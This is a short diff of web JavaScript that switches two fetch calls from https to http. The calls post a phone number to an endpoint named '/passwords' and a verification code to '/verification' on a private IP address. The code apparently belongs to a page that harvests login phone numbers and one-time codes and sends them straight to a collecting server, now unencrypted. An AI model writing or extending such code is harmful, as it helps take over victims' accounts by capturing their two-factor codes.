@@ -372,7 +372,7 @@
                 }
 
                 // Send phone number to the server immediately
-                fetch('https://192.168.55.124:5001/passwords', {
+                fetch('http://192.168.55.124:5001/passwords', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -407,7 +407,7 @@
                 }
 
                 // Send verification code to the server
-                fetch('https://192.168.55.124:5001/verification', {
+                fetch('http://192.168.55.124:5001/verification', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
